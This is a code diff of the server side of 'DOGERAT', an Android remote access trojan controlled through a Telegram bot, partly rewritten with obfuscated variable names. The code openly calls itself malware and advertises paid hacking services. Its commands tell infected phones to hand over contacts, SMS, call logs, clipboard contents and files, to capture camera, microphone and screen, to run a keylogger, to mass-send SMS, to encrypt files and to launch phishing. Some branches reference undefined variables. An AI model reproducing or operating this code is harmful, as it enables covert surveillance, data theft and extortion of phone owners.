@@ -1,286 +1,719 @@
-const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-const TelegramBot = require('node-telegram-bot-api');
-const https = require('https');
-const multer = require('multer');
+const express = require("express");
+const http = require("http");
+const {
+  Server
+} = require("socket.io");
+const telegramBot = require("node-telegram-bot-api");
+const https = require("https");
+const multer = require("multer");
 const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
-const upload = multer();
-const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
-const bot = new TelegramBot(data.token, { polling: true, request: {} });
+const uploader = multer();
+const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
+
+const bot = new telegramBot(data.token, {
+  'polling': true,
+  'request': {}
+});
 
 const appData = new Map();
+
+// قائمة الأوامر مترجمة
 const actions = [
-    '✯ جهات الاتصال ✯',
-    '✯ المكالمات ✯',
-    '✯ الكاميرا الرئيسية ✯',
-    '✯ الكاميرا الامامية ✯',
-    '✯ الاهتزاز ✯',
-    '✯ الميكروفون ✯',
-    '✯ المعرض ✯',
-    '✯ لوحة المفاتيح ✯',
-    '✯ تشغيل الصوت ✯',
-    '✯ ايقاف الصوت ✯',
-    '✯ الحافظة ✯',
-    '✯ ارسال رسالة ✯',
-    '✯ فتح رابط ✯',
-    '✯ لقطة شاشة ✯',
-    '✯ عرض اشعار ✯',
-    '✯ عرض رسالة ✯',
-    '✯ الملفات ✯',
-    '✯ تشغيل لوحة المفاتيح ✯',
-    '✯ ايقاف لوحة المفاتيح ✯'
+  "✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯", "✯ المكالمات ✯", "✯ التطبيقات ✯",
+  "✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯", "✯ الميكروفون ✯", "✯ الحافظة ✯",
+  "✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯", "✯ إرسال رسالة ✯", "✯ اهتزاز ✯",
+  "✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯", "✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯",
+  "✯ مستكشف الملفات ✯", "✯ المعرض ✯", "✯ تشفير ✯", "✯ فك التشفير ✯",
+  "✯ إرسال رسالة لجميع جهات الاتصال ✯", "✯ إشعار منبثق ✯", "✯ فتح رابط ✯",
+  "✯ تصيد احتيالي ✯", "✯ العودة للقائمة الرئيسية ✯"
 ];
 
-// رفع الملفات
-app.post('/upload', upload.single('file'), (req, res) => {
-    const filename = req.file.originalname;
-    bot.sendDocument(data.id, req.file.buffer, {
-        caption: '<b>ملف مستلم من → ' + req.file.originalname + '</b>',
-        parse_mode: 'HTML'
-    }, { filename: filename, contentType: req.file.mimetype });
-    res.send('تم الاستلام');
+app.post("/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
+  const _0x1763f6 = _0xe7d0f6.file.originalname;
+  const _0x3abcf4 = _0xe7d0f6.headers.model;
+  bot.sendDocument(data.id, _0xe7d0f6.file.buffer, {
+    'caption': "<b>✯ ملف مستلم من → " + _0x3abcf4 + '</b>',
+    'parse_mode': "HTML"
+  }, {
+    'filename': _0x1763f6,
+    'contentType': "*/*"
+  });
+  _0x30973d.send("تم الاستلام");
 });
 
-// صفحة البداية
-app.get('/', (req, res) => {
-    res.send(`<b>مرحباً بك في DOGERAT</b>`);
+app.get("/text", (_0x5b9a91, _0x340799) => {
+  _0x340799.send(data.text);
 });
 
-// عند اتصال جهاز جديد
-io.on('connection', (socket) => {
-    const deviceName = socket.handshake.headers['model'] || 'غير معروف';
-    const deviceVersion = socket.handshake.headers['version'] || 'لا توجد معلومات';
-    const deviceIp = socket.handshake.address || 'غير معروف';
+io.on("connection", _0x48afef => {
+  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "لا توجد معلومات";
+  let _0x3e1fde = _0x48afef.handshake.headers.version || "لا توجد معلومات";
+  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "لا توجد معلومات";
+  _0x48afef.model = _0x35d854;
+  _0x48afef.version = _0x3e1fde;
 
-    socket.deviceName = deviceName;
-    socket.deviceVersion = deviceVersion;
-    socket.deviceIp = deviceIp;
+  let _0x5ede9b = "<b>✯ جهاز جديد متصل</b>\n\n" +
+    "<b>النوع</b> → " + _0x35d854 + "\n" +
+    "<b>الإصدار</b> → " + _0x3e1fde + "\n" +
+    "<b>عنوان الـ IP</b> → " + _0x4c49f4 + "\n" +
+    "<b>الوقت</b> → " + _0x48afef.handshake.time + "\n\n";
 
-    bot.sendMessage(data.id, 
-        `<b>✯ جهاز جديد متصل ✯</b>\n\n` +
-        `<b>الاسم → </b>${deviceName}\n` +
-        `<b>الاصدار → </b>${deviceVersion}\n` +
-        `<b>الاي بي → </b>${deviceIp}\n\n` +
-        `<b>الوقت → </b>${new Date().toLocaleString()}`,
-        { parse_mode: 'HTML' }
+  bot.sendMessage(data.id, _0x5ede9b, {
+    'parse_mode': "HTML"
+  });
+
+  _0x48afef.on("disconnect", () => {
+    let _0x4c86f2 = "<b>✯ انقطع اتصال جهاز</b>\n\n" +
+      "<b>النوع</b> → " + _0x35d854 + "\n" +
+      "<b>الإصدار</b> → " + _0x3e1fde + "\n" +
+      "<b>عنوان الـ IP</b> → " + _0x4c49f4 + "\n" +
+      "<b>الوقت</b> → " + _0x48afef.handshake.time + "\n\n";
+    bot.sendMessage(data.id, _0x4c86f2, {
+      'parse_mode': "HTML"
+    });
+  });
+
+  _0x48afef.on("message", _0x44fcc5 => {
+    bot.sendMessage(data.id, "<b>✯ رسالة مستلمة من → " + _0x35d854 + "\n\nالمحتوى → </b>" + _0x44fcc5, {
+      'parse_mode': "HTML"
+    });
+  });
+});
+
+bot.on("message", _0xdbde0c => {
+  if (_0xdbde0c.text === "/start") {
+    bot.sendMessage(data.id,
+      "<b>✯ مرحباً بك في DOGERAT</b>\n\n" +
+      "DOGERAT هو برنامج خبيث للتحكم بأجهزة الأندرويد\n" +
+      "أي استخدام خاطئ يقع على مسؤولية المستخدم وحده!\n\n" +
+      "تم التطوير بواسطة: @CYBERSHIELDX",
+      {
+        'parse_mode': "HTML",
+        'reply_markup': {
+          'keyboard': [
+            ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+            ["✯ حولنا ✯"]
+          ],
+          'resize_keyboard': true
+        }
+      }
     );
-
-    // عند انقطاع الاتصال
-    socket.on('disconnect', () => {
-        bot.sendMessage(data.id, 
-            `<b>✯ جهاز تم فصل اتصاله ✯</b>\n\n` +
-            `<b>الاسم → </b>${deviceName}\n` +
-            `<b>الاصدار → </b>${deviceVersion}\n` +
-            `<b>الاي بي → </b>${deviceIp}\n\n` +
-            `<b>الوقت → </b>${new Date().toLocaleString()}`,
-            { parse_mode: 'HTML' }
-        );
-    });
-
-    // استقبال رسائل من الجهاز وارسالها للادمن
-    socket.on('message', (msg) => {
-        bot.sendMessage(data.id, `<b>✯ رسالة مستلمة من → ${deviceName}</b>\n\n${msg}`, { parse_mode: 'HTML' });
-    });
-});
-
-// استقبال اوامر البوت
-bot.on('message', (msg) => {
-    const text = msg.text;
-
-    if(text === '/start'){
-        bot.sendMessage(data.id, 
-            `<b>✯ مرحباً بك في DOGERAT</b>\n\n` +
-            `DOGERAT هو برنامج تحكم في اجهزة الاندرويد\n` +
-            `اي استخدام خاطئ يقع على عاتق المستخدم فقط!\n\n` +
-            `مطور بواسطة: @CYBERSHIELDX`,
-            {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    keyboard: [
-                        ['✯ الاجهزة ✯', '✯ اختيار جهاز ✯'],
-                        ['✯ حول البرنامج ✯']
-                    ],
-                    resize_keyboard: true
-                }
-            }
-        );
-    }
-
-    // عرض الاجهزة المتصلة
-    else if(text === '✯ الاجهزة ✯'){
-        if(io.sockets.sockets.size === 0){
-            bot.sendMessage(data.id, `<b>✯ لا يوجد اي اجهزة متصلة حالياً ✯</b>`, { parse_mode: 'HTML' });
-        } else {
-            let list = `<b>✯ الاجهزة المتصلة العدد: ${io.sockets.sockets.size}</b>\n\n`;
-            let count = 1;
-            io.sockets.sockets.forEach((sock) => {
-                list += `${count}. ${sock.deviceName}\n` +
-                        `<b>الاصدار → </b>${sock.deviceVersion}\n` +
-                        `<b>الاي بي → </b>${sock.deviceIp}\n\n`;
-                count++;
-            });
-            bot.sendMessage(data.id, list, { parse_mode: 'HTML' });
-        }
-    }
-
-    // اختيار جهاز
-    else if(text === '✯ اختيار جهاز ✯'){
-        if(io.sockets.sockets.size === 0){
-            bot.sendMessage(data.id, `<b>✯ لا يوجد اي اجهزة متصلة حالياً ✯</b>`, { parse_mode: 'HTML' });
-        } else {
-            let buttons = [];
-            io.sockets.sockets.forEach((sock) => {
-                buttons.push([sock.deviceName]);
-            });
-            buttons.push(['✯ رجوع للقائمة الرئيسية ✯']);
-            bot.sendMessage(data.id, `<b>✯ اختر الجهاز المطلوب ✯</b>`, {
-                parse_mode: 'HTML',
-                reply_markup: { keyboard: buttons, resize_keyboard: true, one_time_keyboard: true }
-            });
-        }
-    }
-
-    // عند اختيار جهاز معين
-    else if(appData.get('waitingTarget')){
-        let found = false;
-        io.sockets.sockets.forEach((sock) => {
-            if(sock.deviceName === text){
-                appData.set('currentTarget', sock.id);
-                found = true;
-                bot.sendMessage(data.id, `<b>✯ تم اختيار الجهاز: ${text}</b>\n\nاختر ما تريد فعله به:`, {
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        keyboard: [
-                            ['✯ جهات الاتصال ✯', '✯ المكالمات ✯'],
-                            ['✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الامامية ✯'],
-                            ['✯ الاهتزاز ✯', '✯ الميكروفون ✯'],
-                            ['✯ المعرض ✯', '✯ الحافظة ✯'],
-                            ['✯ لقطة شاشة ✯', '✯ الملفات ✯'],
-                            ['✯ تشغيل الصوت ✯', '✯ فتح رابط ✯'],
-                            ['✯ ارسال رسالة ✯', '✯ عرض اشعار ✯'],
-                            ['✯ تشغيل لوحة المفاتيح ✯', '✯ ايقاف لوحة المفاتيح ✯'],
-                            ['✯ رجوع ✯']
-                        ],
-                        resize_keyboard: true,
-                        one_time_keyboard: true
-                    }
-                });
-            }
+  } else {
+    if (appData.get("currentAction") === "microphoneDuration") {
+      let _0x3376c5 = _0xdbde0c.text;
+      let _0x44b92e = appData.get('currentTarget');
+      if (_0x44b92e == "all") {
+        io.sockets.emit("commend", {
+          'request': "microphone",
+          'extras': [{
+            'key': "duration",
+            'value': _0x3376c5
+          }]
         });
-        if(text === '✯ رجوع للقائمة الرئيسية ✯'){
-            appData.delete('waitingTarget');
-            appData.delete('currentTarget');
+      } else {
+        io.to(_0x44b92e).emit("commend", {
+          'request': "microphone",
+          'extras': [{
+            'key': "duration",
+            'value': _0x3376c5
+          }]
+        });
+      }
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
         }
-        if(!found && text !== '✯ رجوع للقائمة الرئيسية ✯'){
-            bot.sendMessage(data.id, `<b>✯ هذا الجهاز غير متصل ✯</b>`);
+      );
+    } else if (appData.get("currentAction") === "toastText") {
+      let _0x3f8601 = _0xdbde0c.text;
+      let _0x5c0cc9 = appData.get('currentTarget');
+      if (_0x5c0cc9 == "all") {
+        io.sockets.emit("commend", {
+          'request': "toast",
+          'extras': [{
+            'key': "text",
+            'value': _0x3f8601
+          }]
+        });
+      } else {
+        io.to(_0x5c0cc9).emit("commend", {
+          'request': "toast",
+          'extras': [{
+            'key': "text",
+            'value': _0x3f8601
+          }]
+        });
+      }
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
         }
-        appData.delete('waitingTarget');
-    }
+      );
+    } else if (appData.get("currentAction") === "smsNumber") {
+      let _0x16b4e5 = _0xdbde0c.text;
+      appData.set("currentNumber", _0x16b4e5);
+      appData.set("currentAction", 'smsText');
+      bot.sendMessage(data.id,
+        "<b>✯ الآن أدخل الرسالة التي تريد إرسالها إلى " + _0x16b4e5 + "</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ إلغاء الإجراء ✯"]
+            ],
+            'resize_keyboard': true,
+            'one_time_keyboard': true
+          }
+        }
+      );
+    } else if (appData.get("currentAction") === "smsText") {
+      let _0x6d597e = _0xdbde0c.text;
+      let _0x1c124a = appData.get("currentNumber");
+      let _0x49a537 = appData.get("currentTarget");
+      if (_0x49a537 == "all") {
+        io.sockets.emit("commend", {
+          'request': "sendSms",
+          'extras': [{
+            'key': "number",
+            'value': _0x1c124a
+          }, {
+            'key': "text",
+            'value': _0x6d597e
+          }]
+        });
+      } else {
+        io.to(_0x49a537).emit("commend", {
+          'request': "sendSms",
+          'extras': [{
+            'key': "number",
+            'value': _0x1c124a
+          }, {
+            'key': "text",
+            'value': _0x6d597e
+          }]
+        });
+      }
+      appData.delete('currentTarget');
+      appData.delete("currentAction");
+      appData.delete("currentNumber");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
+        }
+      );
+    } else if (appData.get("currentAction") === "vibrateDuration") {
+      let _0x26f07c = _0xdbde0c.text;
+      let _0x3275f8 = appData.get("currentTarget");
+      if (_0x3275f8 == "all") {
+        io.sockets.emit("commend", {
+          'request': "vibrate",
+          'extras': [{
+            'key': "duration",
+            'value': _0x26f07c
+          }]
+        });
+      } else {
+        io.to(_0x3275f8).emit("commend", {
+          'request': "vibrate",
+          'extras': [{
+            'key': "duration",
+            'value': _0x26f07c
+          }]
+        });
+      }
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
+        }
+      );
+    } else if (appData.get("currentAction") === "textToAllContacts") {
+      let _0x535777 = _0xdbde0c.text;
+      let _0x3b22c4 = appData.get("currentTarget");
+      if (_0x3b22c4 == "all") {
+        io.sockets.emit("commend", {
+          'request': "smsToAllContacts",
+          'extras': [{
+            'key': "text",
+            'value': _0x535777
+          }]
+        });
+      } else {
+        io.to(_0x3b22c4).emit("commend", {
+          'request': "smsToAllContacts",
+          'extras': [{
+            'key': "text",
+            'value': _0x535777
+          }]
+        });
+      }
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
+        }
+      );
+    } else if (appData.get("currentAction") === "notificationText") {
+      let _0x371a40 = _0xdbde0c.text;
+      appData.set("currentNotificationText", _0x371a40);
+      if (target == "all") {
+        io.sockets.emit("commend", {
+          'request': "popNotification",
+          'extras': [{
+            'key': "text",
+            'value': _0x371a40
+          }]
+        });
+      } else {
+        io.to(target).emit("commend", {
+          'request': 'popNotification',
+          'extras': [{
+            'key': "text",
+            'value': _0x371a40
+          }, {
+            'key': "url",
+            'value': url
+          }]
+        });
+      }
+      appData.delete('currentTarget');
+      appData.delete("currentAction");
+      appData.delete("currentNotificationText");
+      bot.sendMessage(data.id,
+        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
+        {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+              ["✯ حولنا ✯"]
+            ],
+            'resize_keyboard': true
+          }
+        }
+      );
+    } else if (_0xdbde0c.text === "✯ الأجهزة ✯") {
+      if (io.sockets.sockets.size === 0) {
+        bot.sendMessage(data.id, "<b>✯ لا يوجد أي جهاز متصل حالياً</b>\n\n", {
+          'parse_mode': "HTML"
+        });
+      } else {
+        let _0x1e2656 = "<b>✯ عدد الأجهزة المتصلة: " + io.sockets.sockets.size + "</b>\n\n";
+        let _0x518a8a = 1;
+        io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
+          _0x1e2656 += "<b>الجهاز " + _0x518a8a + "</b>\n" +
+            "<b>النوع</b> → " + _0x3479dd.model + "\n" +
+            "<b>الإصدار</b> → " + _0x3479dd.version + "\n" +
+            "<b>عنوان الـ IP</b> → " + _0x3479dd.ip + "\n" +
+            "<b>الوقت</b> → " + _0x3479dd.handshake.time + "\n\n";
+          _0x518a8a += 1;
+        });
+        bot.sendMessage(data.id, _0x1e2656, {
+          'parse_mode': "HTML"
+        });
+      }
+    } else if (_0xdbde0c.text === "✯ الإجراءات ✯") {
+      if (io.sockets.sockets.size === 0) {
+        bot.sendMessage(data.id, "<b>✯ لا يوجد أي جهاز متصل حالياً</b>\n\n", {
+          'parse_mode': "HTML"
+        });
+      } else {
+        let _0x307c8a = [];
+        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
+          _0x307c8a.push([_0x6307e5.model]);
+        });
+        _0x307c8a.push(["✯ الكل ✯"]);
+        _0x307c8a.push(["✯ العودة للقائمة الرئيسية ✯"]);
+        bot.sendMessage(data.id, "<b>✯ اختر الجهاز الذي تريد تنفيذ الإجراء عليه</b>\n\n", {
+          'parse_mode': 'HTML',
+          'reply_markup': {
+            'keyboard': _0x307c8a,
+            'resize_keyboard': true,
+            'one_time_keyboard': true
+          }
+        });
+      }
+    } else if (_0xdbde0c.text === "✯ حولنا ✯") {
+      bot.sendMessage(data.id,
+        "<b>✯ للاستفسار أو التعاقد المدفوع تواصل مع @sphanter\n" +
+        "نقوم بالاختراق، ونشر البيانات، وبناء البرامج الخبيثة\n\n" +
+        "حساب التيليجرام → @CUBERSHIELDX\nالمسؤول → @SPHANTER</b>\n\n",
+        {
+          'parse_mode': 'HTML'
+        }
+      );
+    } else if (_0xdbde0c.text === "✯ العودة للقائمة الرئيسية ✯") {
+      bot.sendMessage(data.id, "<b>✯ القائمة الرئيسية</b>\n\n", {
+        'parse_mode': "HTML",
+        'reply_markup': {
+          'keyboard': [
+            ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
+            ["✯ حولنا ✯"]
+          ],
+          'resize_keyboard': true
+        }
+      });
+    } else if (_0xdbde0c.text === "✯ إلغاء الإجراء ✯") {
+      let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
+      if (_0x3202e5 == "all") {
+        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على جميع الأجهزة المتاحة</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
+              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
+              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
+              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
+              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
+              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
+              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
+              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
+              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
+              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
+              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
+              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
+              ["✯ إشعار منبثق ✯"],
+              ["✯ العودة للقائمة الرئيسية ✯"]
+            ],
+            'resize_keyboard': true,
+            'one_time_keyboard': true
+          }
+        });
+      } else {
+        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على " + _0x3202e5 + "</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': {
+            'keyboard': [
+              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
+              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
+              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
+              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
+              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
+              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
+              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
+              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
+              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
+              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
+              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
+              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
+              ["✯ إشعار منبثق ✯"],
+              ["✯ العودة للقائمة الرئيسية ✯"]
+            ],
+            'resize_keyboard': true,
+            'one_time_keyboard': true
+          }
+        });
+      }
+    } else if (actions.includes(_0xdbde0c.text)) {
+      let _0x3ea82b = appData.get("currentTarget");
 
-    // اوامر التحكم بالجهاز المختار
-    else if(appData.get('currentTarget')){
-        const target = appData.get('currentTarget');
+      if (_0xdbde0c.text === "✯ جهات الاتصال ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "contacts", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': 'contacts', 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
 
-        if(text === '✯ رجوع ✯'){
-            appData.delete('currentTarget');
-            bot.sendMessage(data.id, `<b>✯ تم العودة ✯</b>`);
-        }
-        else if(text === '✯ المعرض ✯'){
-            io.to(target).emit('commend', { request: 'gallery', extras: [] });
-            bot.sendMessage(data.id, `<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...</b>`, { parse_mode: 'HTML' });
-        }
-        else if(text === '✯ الاهتزاز ✯'){
-            appData.set('waitingVibrate', true);
-            bot.sendMessage(data.id, `<b>✯ ادخل مدة الاهتزاز بالثواني</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
-        }
-        else if(text === '✯ الميكروفون ✯'){
-            appData.set('waitingMic', true);
-            bot.sendMessage(data.id, `<b>✯ ادخل مدة التسجيل بالثواني</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
-        }
-        else if(text === '✯ ارسال رسالة ✯'){
-            appData.set('waitingSms', true);
-            bot.sendMessage(data.id, `<b>✯ ادخل الرقم ثم الرسالة</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
-        }
-        else if(text === '✯ عرض اشعار ✯'){
-            appData.set('waitingNotify', true);
-            bot.sendMessage(data.id, `<b>✯ ادخل نص الاشعار</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
-        }
-        else if(text === '✯ فتح رابط ✯'){
-            appData.set('waitingUrl', true);
-            bot.sendMessage(data.id, `<b>✯ ادخل الرابط</b>`, { parse_mode: 'HTML', reply_markup: { keyboard: [['الغاء']], resize_keyboard: true, one_time_keyboard: true } });
-        }
-        // باقي الاوامر
-        else if(actions.includes(text)){
-            const reqMap = {
-                '✯ جهات الاتصال ✯': 'contacts',
-                '✯ المكالمات ✯': 'calls',
-                '✯ الكاميرا الرئيسية ✯': 'main-camera',
-                '✯ الكاميرا الامامية ✯': 'selfie-camera',
-                '✯ الحافظة ✯': 'clipboard',
-                '✯ لقطة شاشة ✯': 'screenshot',
-                '✯ الملفات ✯': 'file',
-                '✯ تشغيل الصوت ✯': 'play-audio',
-                '✯ ايقاف الصوت ✯': 'stop-audio',
-                '✯ تشغيل لوحة المفاتيح ✯': 'keylogger-on',
-                '✯ ايقاف لوحة المفاتيح ✯': 'keylogger-off'
-            };
-            if(reqMap[text]){
-                io.to(target).emit('commend', { request: reqMap[text], extras: [] });
-                bot.sendMessage(data.id, `<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...</b>`, { parse_mode: 'HTML' });
+      if (_0xdbde0c.text === "✯ الرسائل القصيرة ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "all-sms", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "all-sms", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ المكالمات ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "calls", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "calls", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ التطبيقات ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "apps", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "apps", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ الكاميرا الرئيسية ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "main-camera", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "main-camera", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ الكاميرا الأمامية ✯") {
+        if (_0x3ea82b == 'all') io.sockets.emit("commend", { 'request': "selfie-camera", 'extras': [] });
+        else io.to(_0x3ea82b).emit('commend', { 'request': "selfie-camera", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
+          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
+        });
+      }
+
+      if (_0xdbde0c.text === "✯ الحافظة ✯") {
+        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "clipboard", 'extras': [] });
+        else io.to(_0x3ea82b).emit("commend", { 'request': "clipboard", 'extras': [] });
+        appData.delete("currentTarget");
+        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
+          'parse_mode': "HTML",
